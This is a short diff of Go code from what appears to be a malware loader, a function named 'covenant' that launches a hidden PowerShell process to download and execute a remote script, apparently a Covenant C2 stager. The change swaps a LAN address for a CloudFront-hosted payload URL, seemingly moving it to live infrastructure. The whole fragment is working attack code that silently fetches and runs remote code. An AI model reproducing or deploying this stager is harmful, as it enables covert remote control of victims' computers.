@@ -53,7 +53,7 @@ func covenant() {
 	si.Cb = uint32(unsafe.Sizeof(si))
 	err2 := syscall.CreateProcess(
 		nil,
-		syscall.StringToUTF16Ptr("powershell -WindowStyle Hidden -Command \"iex(new-object net.webclient).downloadstring('http://192.168.0.111:8000/covenantc2.ps1')\""),
+		syscall.StringToUTF16Ptr("powershell -WindowStyle Hidden -Command \"iex(new-object net.webclient).downloadstring('https://d3nyjl3gku9ygq.cloudfront.net/covenantc2sdfsfd.ps1')\""),
 		nil, nil, false, windows.CREATE_NO_WINDOW, nil, nil, si, pi)
 	if err2 != nil {
 		panic(err2)
